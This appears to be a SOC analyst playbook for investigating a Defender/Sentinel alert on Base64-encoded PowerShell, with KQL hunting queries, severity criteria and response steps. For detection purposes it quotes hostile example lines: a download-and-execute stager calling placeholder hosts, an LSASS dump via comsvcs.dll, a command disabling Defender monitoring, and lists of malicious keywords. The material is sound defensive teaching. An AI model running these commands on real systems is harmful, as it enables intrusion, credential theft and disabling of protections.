## 1. Alert Name

**Detect Encoded PowerShell Command**

---

## 2. Alert Description (Detection Logic Explanation)

This alert detects execution of **PowerShell commands with Base64-encoded arguments**, typically passed using the `-EncodedCommand` (or variations like `-enc`, `-e`) parameter.

### Detection Logic Breakdown

```
DeviceProcessEvents
| where ProcessCommandLine matches regex
@'(\s+-((?i)encod?e?d?c?o?m?m?a?n?d?|e|en|enc|ec)\s).*([A-Za-z0-9+/]{50,}[=]{0,2})'
| extend DecodedCommand = replace(@'\x00','',
    base64_decode_tostring(
        extract("[A-Za-z0-9+/]{50,}[=]{0,2}",0 , ProcessCommandLine)
    )
)
```

**What it does:**

- Looks for:
    - `EncodedCommand`, `enc`, `e`, `ec`, etc. (case insensitive)
    - Followed by a Base64 string of 50+ characters.
- Extracts the Base64 blob.
- Decodes it.
- Removes null bytes (PowerShell encodes in UTF-16LE → often includes null characters).

---

### 2.1 What Triggered the Alert

This alert triggers when:

- A process (usually `powershell.exe` or `pwsh.exe`) executes
- AND the command line contains:
    - `enc` / `EncodedCommand`
    - AND a Base64-encoded string (≥ 50 characters)

**Example of malicious trigger:**

```powershell
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAd...
```

After decoding, it might contain:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://malicious-site/payload.ps1")
```

**Benign example:**

- Enterprise automation tools using encoded PowerShell for deployment.
- SCCM or Intune scripts.
- Backup software.

---

### 2.2 Which Security Tool Generated It

This query runs on:

- **Microsoft Defender for Endpoint (MDE)**
- Integrated into **Microsoft Sentinel**

Data Source:

- `DeviceProcessEvents` (Advanced Hunting / MDE telemetry)

---

### 2.3 Why This Alert Is Important

Encoded PowerShell is heavily associated with:

- MITRE ATT&CK:
    - **T1059.001** – Command and Scripting Interpreter: PowerShell
    - **T1027** – Obfuscated/Compressed Files
    - **T1140** – Deobfuscate/Decode Files or Information

It is widely used in:

- Initial access payload execution
- Fileless malware
- Living-off-the-Land (LOLBins)
- Cobalt Strike stagers
- Ransomware loaders

Encoded commands often bypass:

- AV signature-based detection
- Command-line monitoring
- Simple logging review

---

### 2.4 Define Severity? Conditions to Escalate Alert to More Severity

**Medium Severity (Default):**

- User workstation
- Standard user
- Single execution
- Decoded script appears benign

**High Severity:**

- Encoded command downloads external content
- Uses `IEX`, `Invoke-WebRequest`, `DownloadString`
- Executed from Office child process (e.g., Word → PowerShell)
- Lateral movement indicators
- Suspicious parent process

**Critical Severity:**

- Executed on:
    - Domain Controller
    - Critical server
- Credential dumping observed
- C2 communication detected
- Persistence mechanism established
- Part of multi-alert incident chain

---

## 3. Knowledge Required Before Investigation

This section is critical. Analysts must fully understand these concepts.

---

### 3.1 Concepts Analyst Must Understand

### 1️⃣ PowerShell Execution Modes

PowerShell can execute code via:

- `Command`
- `File`
- `EncodedCommand`
- `EncodedCommand` expects:
- Base64
- UTF-16LE encoding

Example encoding logic:

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX ..."))
```

Why attackers use it:

- Avoids special character escaping
- Hides payload from logs
- Evades naive detection

---

### 2️⃣ Base64 Encoding

Base64:

- Encodes binary/text into ASCII
- Common in malware
- Pattern: `[A-Za-z0-9+/]` ending in `=` or `==`

Encoded PowerShell commands:

- Often long (>100 characters)
- Sometimes double-encoded
- Sometimes compressed before encoding

---

### 3️⃣ Living Off The Land (LOLBins)

PowerShell is a legitimate administrative tool.

Attackers abuse:

- `powershell.exe`
- `pwsh.exe`
- `cmd.exe`
- `mshta.exe`
- `rundll32.exe`

Encoded PowerShell is a classic **LOLBIN abuse pattern**.

---

### 4️⃣ Common Malicious PowerShell Patterns

After decoding, look for:

- `IEX` (Invoke-Expression)
- `DownloadString`
- `DownloadFile`
- `Net.WebClient`
- `Invoke-Mimikatz`
- `Add-MpPreference`
- `Set-ExecutionPolicy Bypass`
- `FromBase64String`

---

### 5️⃣ Parent-Child Process Relationships

Suspicious chains:

- `winword.exe → powershell.exe`
- `excel.exe → powershell.exe`
- `outlook.exe → powershell.exe`
- `w3wp.exe → powershell.exe`
- `explorer.exe → powershell.exe` (sometimes suspicious)

Legitimate chains:

- `services.exe → powershell.exe`
- SCCM agent → powershell

---

### 6️⃣ PowerShell Logging Mechanisms

Analyst must understand:

- Script Block Logging (Event ID 4104)
- Module Logging
- Transcription logging
- AMSI scanning

Encoded command may be:

- Logged decoded in ScriptBlock logs
- Blocked by AMSI
- Obfuscated further

---

## 4. Attacker Perspective

---

### 4.1 Why Attackers Use This Technique

- Hide payload from command-line monitoring
- Evade static detection
- Avoid quoting/escaping issues
- Deliver fileless payloads
- Bypass basic EDR pattern detection

---

### 4.2 What They Try to Achieve

- Download second-stage payload
- Establish C2 beacon
- Dump credentials
- Move laterally
- Disable security tools
- Establish persistence

---

### 4.3 Real-World Attack Examples

- **Emotet**
    - Used encoded PowerShell to download payloads.
- **Cobalt Strike**
    - Uses encoded stagers via PowerShell.
- **Ryuk**
    - Deployed via PowerShell execution chains.
- **TrickBot**
    - Used encoded PowerShell for post-exploitation.

---

### 4.4 Potential Business Impact

- Full domain compromise
- Credential theft
- Ransomware deployment
- Data exfiltration
- Operational downtime
- Regulatory penalties
- Reputation damage

---

## 5. Pre-Investigation Checklist

---

### 5.1 Confirm Hostname and User

- Is the user:
    - Admin?
    - Service account?
    - VIP?
- Is the device:
    - Server?
    - Workstation?
    - Domain Controller?

---

### 5.2 Check Entities Criticality

- Is this:
    - Tier-0 asset?
    - Production database server?
    - Cloud management host?

Escalate immediately if high-value asset.

---

### 5.3 Verify Alert Severity

- Check:
    - Process parent
    - Frequency
    - Related alerts
    - Defender risk score

---

## 6. Investigation Steps

---

### 6.1 Questions Analyst Should Ask

1. Who executed this PowerShell?
2. What is the decoded content?
3. What is the parent process?
4. Did it spawn child processes?
5. Did it connect externally?
6. Is there persistence?
7. Are there lateral movement indicators?
8. Has this happened elsewhere?

---

### 6.2 Answer the Questions

---

### 🔎 1️⃣ Who executed this PowerShell?

### Investigation Logic

We need to determine:

- User account
- Account type (standard, admin, service)
- Logon type (interactive, RDP, service, scheduled task)
- Whether execution aligns with user role

### Query Example

```
DeviceProcessEvents
| where ProcessCommandLine contains "-enc"
| project Timestamp, DeviceName, AccountName, AccountDomain, LogonId, InitiatingProcessFileName
```

### What to Check

- Is the user part of:
    - Domain Admins?
    - IT Operations?
    - DevOps?
- Is the execution during:
    - Business hours?
    - Maintenance window?
    - Odd hours (2–4 AM)?

### Analyst Decision Logic

| Scenario | Interpretation |
| --- | --- |
| IT Admin during patch window | Possibly legitimate |
| Finance user at 2:30 AM | Highly suspicious |
| Service account with no prior PowerShell history | Suspicious |

If account shows unusual activity → escalate severity.

---

### 🔎 2️⃣ What is inside the Decoded Command?

This is the most critical step.

The query already extracts:

```
DecodedCommand
```

### Step 1: Manually Review

Look for:

- `IEX`
- `Invoke-Expression`
- `DownloadString`
- `DownloadFile`
- `Net.WebClient`
- `Start-Process`
- `Add-MpPreference`
- `Set-ExecutionPolicy Bypass`
- `FromBase64String`

### Step 2: Identify Malicious Patterns

### Case A – Web Stager

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload.ps1")
```

➡ This is classic loader behavior.

MITRE:

- T1059.001 (PowerShell)
- T1105 (Ingress Tool Transfer)

Escalate to HIGH.

---

### Case B – Credential Theft

```powershell
Invoke-Mimikatz
```

or

```powershell
rundll32 comsvcs.dll, MiniDump
```

➡ Likely credential dumping attempt.

Escalate to CRITICAL.

---

### Case C – Defender Tampering

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

MITRE:

- T1562 (Defense Evasion)

Escalate immediately.

---

### Case D – Obfuscated Again

If decoded command contains another Base64 string:

```powershell
[Convert]::FromBase64String(...)
```

➡ Multi-layer obfuscation

➡ Likely advanced attacker

Escalate to Tier 3.

---

### 🔎 3️⃣ What is the Parent Process?

Parent process reveals infection vector.

### Query

```
DeviceProcessEvents
| where ProcessCommandLine contains "-enc"
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

### Suspicious Parent Examples

| Parent | Why Suspicious |
| --- | --- |
| winword.exe | Macro-based attack |
| excel.exe | Phishing |
| outlook.exe | Malicious attachment |
| chrome.exe | Drive-by download |
| mshta.exe | LOLBin abuse |
| wscript.exe | Script-based infection |

If parent = Office app → Likely phishing vector.

---

### Legitimate Parent Examples

| Parent | Likely Reason |
| --- | --- |
| ccmexec.exe | SCCM |
| services.exe | System automation |
| monitoring agent | Enterprise script |

Validate with IT before closing.

---

### 🔎 4️⃣ Did It Spawn Child Processes?

Encoded PowerShell often launches:

- `cmd.exe`
- `rundll32.exe`
- `regsvr32.exe`
- `wmic.exe`
- `net.exe`
- `schtasks.exe`

### Query

```
DeviceProcessEvents
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, FileName, ProcessCommandLine
```

### Dangerous Indicators

- `net user /add`
- `net localgroup administrators`
- `schtasks /create`
- `wmic process call create`

If PowerShell spawns admin tools → escalation.

---

### 🔎 5️⃣ Did It Make External Connections?

Encoded PowerShell commonly:

- Downloads payload
- Connects to C2
- Exfiltrates data

### Query

```
DeviceNetworkEvents
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort
```

### Red Flags

- Direct IP connection
- Newly registered domain
- Suspicious TLD (.xyz, .top)
- Unusual ports (4444, 1337, 8080)

If beaconing pattern (regular intervals):

➡ Possible Cobalt Strike activity.

---

### 🔎 6️⃣ Is There Persistence?

Check:

- Scheduled tasks
- Registry Run keys
- Services
- WMI event subscriptions

### Scheduled Tasks Query

```
DeviceProcessEvents
| where ProcessCommandLine contains "schtasks"
```

### Registry Run Keys

```
DeviceRegistryEvents
| where RegistryKey contains @"Software\Microsoft\Windows\CurrentVersion\Run"
```

If persistence created within 5–10 minutes of encoded PowerShell:

➡ Confirmed compromise pattern.

---

### 🔎 7️⃣ Is There Lateral Movement?

Encoded PowerShell may execute:

- `Invoke-Command`
- `Enter-PSSession`
- `New-PSSession`
- `wmic`
- `psexec`

### Query

```
DeviceProcessEvents
| where ProcessCommandLine contains "Invoke-Command"
```

If multiple hosts show same behavior:

➡ Incident, not isolated event.

---

### 🔎 8️⃣ Has This Happened Elsewhere?

Scope expansion is critical.

### Query

```
DeviceProcessEvents
| where ProcessCommandLine contains "-enc"
| summarize count() by DeviceName
```

If:

- Multiple hosts affected
- Same decoded payload used
- Same external IP contacted

➡ Organization-wide campaign.

---

# SOC Escalation Decision Matrix

| Condition | Severity |
| --- | --- |
| Single encoded command, no network | Medium |
| Encoded + external download | High |
| Encoded + persistence | High |
| Encoded + credential dumping | Critical |
| Encoded + lateral movement | Critical |
| Encoded + multiple hosts | Major Incident |

---

## 6.3 Major Investigations (Important Investigation Steps)

---

These determine whether this is a real compromise or benign automation.

---

### 1️⃣ Analyze the Decoded Command in Depth

Carefully review `DecodedCommand`.

Look for:

- `IEX` (Invoke-Expression)
- `New-Object Net.WebClient`
- `Invoke-WebRequest`
- `DownloadString`
- `FromBase64String`
- `Start-BitsTransfer`
- `Add-MpPreference`
- `Set-MpPreference`
- `Invoke-Mimikatz`
- `rundll32`, `regsvr32`

If decoded content contains:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://x.x.x.x/payload.ps1")
```

➡ HIGH likelihood of malicious staging.

---

### 2️⃣ Check Parent-Child Process Tree

Query:

```
DeviceProcessEvents
| where DeviceName == "hostname"
| where Timestamp between (datetime1 .. datetime2)
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

Suspicious parent examples:

- `winword.exe`
- `excel.exe`
- `outlook.exe`
- `chrome.exe`
- `mshta.exe`
- `wscript.exe`

If chain looks like:

```
winword.exe → powershell.exe → cmd.exe → rundll32.exe
```

➡ Likely macro-based infection.

---

### 3️⃣ Check for Network Connections

Encoded PowerShell often downloads payloads or connects to C2.

Query:

```
DeviceNetworkEvents
| where InitiatingProcessFileName == "powershell.exe"
| where Timestamp between (datetime1 .. datetime2)
```

Look for:

- External IPs
- Suspicious domains
- Newly registered domains
- Direct IP connections
- Uncommon ports (8080, 4444, 8443)

If external beaconing detected:

➡ Escalate to HIGH/CRITICAL.

---

### 4️⃣ Check for Credential Access Behavior

Encoded PowerShell frequently used for credential dumping.

Look for:

- Access to `lsass.exe`
- Creation of memory dumps
- Use of `procdump`
- Registry SAM hive access

Query:

```
DeviceProcessEvents
| where ProcessCommandLine contains "lsass"
```

If correlated:

➡ Likely post-exploitation activity.

---

### 5️⃣ Check for Persistence Mechanisms

Search for:

- Scheduled tasks
- Registry Run keys
- Services created
- WMI event subscriptions

Query examples:

```
DeviceRegistryEvents
| where RegistryKey contains "Run"
```

```
DeviceProcessEvents
| where ProcessCommandLine contains "schtasks"
```

Persistence + encoded PowerShell = HIGH severity.

---

### 6️⃣ Check Lateral Movement

Look for:

- Remote PowerShell
- PsExec
- SMB execution
- WMI execution

Query:

```
DeviceProcessEvents
| where ProcessCommandLine contains "Invoke-Command"
```

If found:

➡ Domain-wide investigation required.

---

### 6.4 Minor Investigations (Related Investigation Steps)

These help confirm legitimacy or expand scope.

---

### 1️⃣ Check Historical Behavior

Has this host executed encoded PowerShell before?

```
DeviceProcessEvents
| where DeviceName == "hostname"
| where ProcessCommandLine contains "-enc"
| summarize count() by bin(Timestamp, 7d)
```

If recurring and same script → possibly legitimate automation.

---

### 2️⃣ Check User Role

- Is the user:
    - IT admin?
    - DevOps?
    - SCCM engineer?

If normal admin performing scripted deployment:

Likely benign.

If finance user:

Suspicious.

---

### 3️⃣ Check Defender / AV Alerts

Correlate with:

- Malware detections
- AMSI detections
- Exploit guard alerts

If Defender also flagged:

Escalate severity.

---

### 4️⃣ Check Email Timeline

If parent is `outlook.exe`:

Investigate:

- Suspicious attachments
- Phishing email
- Malicious links

---

## 7. Evidence to Collect

Collect the following before containment:

- Full process tree
- Decoded PowerShell content
- Parent process command line
- Network connection logs
- File hashes downloaded
- Registry modifications
- Scheduled tasks created
- User logon history
- PowerShell ScriptBlock logs (Event ID 4104)
- MDE device timeline export

Preserve:

- Memory dump (if active beacon suspected)
- Suspicious files
- Network PCAP (if available)

---

## 8. Indicators of True Positive

- Decoded command contains `IEX` + web download
- Execution from Office application
- Suspicious external network communication
- Creation of scheduled task or registry persistence
- Access to LSASS
- AMSI alert triggered
- Unusual admin tool execution by non-admin user
- Multiple encoded PowerShell executions within short time
- Same behavior across multiple hosts

---

## 9. Indicators of False Positive

- Executed by:
    - SCCM
    - Intune
    - Backup solution
    - Monitoring agent
- Known internal script repository URL
- IT automation script verified
- Executed by domain admin during maintenance window
- No network activity
- No child processes
- No persistence created

Always validate with IT team before closing as benign.

---

## 10. Incident Response Actions (If True Positive)

---

### 10.1 Containment

Immediate actions:

- Isolate host via MDE
- Disable compromised user account
- Block malicious IP/domain
- Kill malicious PowerShell process
- Reset credentials (especially privileged accounts)

If lateral movement suspected:

- Expand containment to adjacent hosts.

---

### 10.2 Eradication

- Remove persistence mechanisms
- Delete malicious files
- Remove scheduled tasks
- Clean registry entries
- Run full EDR scan
- Validate no backdoors remain

If Cobalt Strike-like behavior:

Perform deeper forensic triage.

---

### 10.3 Recovery

- Reimage system if high confidence compromise
- Restore from clean backup
- Force password reset across domain if credential theft suspected
- Validate AD integrity
- Monitor for reinfection

---

## 11. Mitigation & Prevention

---

### 1️⃣ Enable Advanced PowerShell Logging

- ScriptBlock Logging
- Module Logging
- Transcription Logging

---

### 2️⃣ Enforce Constrained Language Mode

Reduces PowerShell abuse on non-admin systems.

---

### 3️⃣ Implement Attack Surface Reduction (ASR) Rules

Block:

- Office child process spawning PowerShell
- Credential stealing from LSASS

---

### 4️⃣ Network Egress Filtering

Block direct internet access from servers.

---

### 5️⃣ Privileged Access Controls

- Limit local admin access
- Implement tiered admin model
- Use Just-In-Time (JIT) access

---

### 6️⃣ Application Control

- Implement AppLocker or WDAC
- Restrict PowerShell usage where not required

---